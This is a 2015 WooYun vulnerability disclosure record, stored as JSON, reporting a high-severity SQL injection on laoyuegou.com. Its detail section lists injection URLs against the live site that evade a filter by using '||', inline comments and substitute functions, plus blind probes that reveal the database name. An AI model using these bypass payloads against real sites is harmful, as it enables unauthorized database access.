{"id": 83705, "wybug_id": "wooyun-2015-0146973", "wybug_title": "捞月狗主站存在SQL注入可绕过", "wybug_corp": "laoyuegou.com", "wybug_author": "深度安全实验室", "wybug_date": "2015-10-15 16:39", "wybug_open_date": "2015-11-29 21:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-29：\t细节向公众公开  简要描述：  详细说明：  http://www.laoyuegou.com/media/video/renqi/top/dota2/type/hero?hero_name=1#1：2个or不行\nhttp://www.laoyuegou.com/media/video/renqi/top/dota2/type/hero?hero_name=1' or 1=1 or  'a%'='b\n\n\n将第一个or换成||\n\n为假时：\n\n#2：\nhttp://www.laoyuegou.com/media/video/renqi/top/dota2/type/hero?hero_name=1' || length(database())>0 or  'a%'='b\nlength(database())不可用，\n\n使用length/**/(database())\n\n#3:至此发现该站的防护应该是基于某种组合，那么\nhttp://www.laoyuegou.com/media/video/renqi/top/dota2/type/hero?hero_name=1' || ascii(mid(database(),1,1))>0 or  'a%'='b\n必然也不行\n\n将ascii换成ord，mid换成substr，二者一起换掉就行了：\n\n   漏洞证明：  db的长度为14\nhttp://www.laoyuegou.com/media/video/renqi/top/dota2/type/hero?hero_name=1' || length/**/(database())=14 or  'a%'='b\n\n\ndb的第一位为l（ascii码108）\nhttp://www.laoyuegou.com/media/video/renqi/top/dota2/type/hero?hero_name=1' || ord(substr(database(),1,1))=108 or  'a%'='b\n\n\n剩下的用用超级SQL注入工具：注入绕过参数设置：\n\n比对关键字：敌法师\n\n结果：\n\n   修复方案：     版权声明：转载请注明来源 深度安全实验室@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2015-10-15 21:29 厂商回复： 我们尽快修复哈 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-02-11 14:20 |    \t\tRand0m \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:6        | 竟然还有人冒充我，醉了，骗子QQ：44569754...)\t\t \n  屌，试了好多姿势都没绕过    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}